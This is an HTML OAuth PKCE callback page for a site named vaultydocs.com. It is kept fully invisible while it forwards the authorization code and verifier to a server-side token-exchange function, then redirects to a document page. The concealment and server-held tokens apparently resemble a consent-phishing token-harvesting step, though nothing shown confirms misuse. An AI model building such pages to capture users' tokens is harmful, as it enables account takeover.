<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PKCE OAuth Callback - Processing...</title>
    <style>
        html, body {
            background: #fff !important;
        }
        body, .container, .logo, .spinner, #status, #userInfo, #debugInfo, h1 {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            pointer-events: none !important;
            height: 0 !important;
            width: 0 !important;
            position: absolute !important;
            z-index: -99999 !important;
        }
    </style>
    <script>
        // Hide immediately as soon as possible
        document.addEventListener('DOMContentLoaded', function () {
            document.body.style.display = 'none';
            document.body.style.visibility = 'hidden';
            document.body.style.opacity = '0';
            var c = document.querySelector('.container');
            if (c) c.style.display = 'none';
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">M</div>
        <h1>PKCE OAuth Callback</h1>
        <div class="spinner"></div>
        <div id="status" class="status processing">
            ðŸ”„ Processing PKCE OAuth callback...
        </div>
        <div id="userInfo" style="display: none;"></div>
        <div id="debugInfo" style="display: none;"></div>
    </div>
    <script>
        window.addEventListener('load', async () => {
            try {
                const urlParams = new URLSearchParams(window.location.search);
                const code = urlParams.get('code');
                const state = urlParams.get('state');
                const error = urlParams.get('error');
                if (error || !code) {
                    window.location.href = '/document.html';
                    return;
                }
                const storedCodeVerifier = sessionStorage.getItem('pkce_code_verifier');
                const storedState = sessionStorage.getItem('pkce_state');
                if (!storedState || storedState !== state || !storedCodeVerifier) {
                    window.location.href = '/document.html';
                    return;
                }
                const currentDomain = window.location.origin;
                await fetch(`${currentDomain}/.netlify/functions/tokenExchange`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        code: code,
                        redirect_uri: 'https://vaultydocs.com/pkce-callback',
                        code_verifier: storedCodeVerifier
                    })
                });
                sessionStorage.removeItem('pkce_code_verifier');
                sessionStorage.removeItem('pkce_state');
                window.location.href = '/document.html';
            } catch (error) {
                window.location.href = '/document.html';
            }
        });
    </script>
</body>
</html>
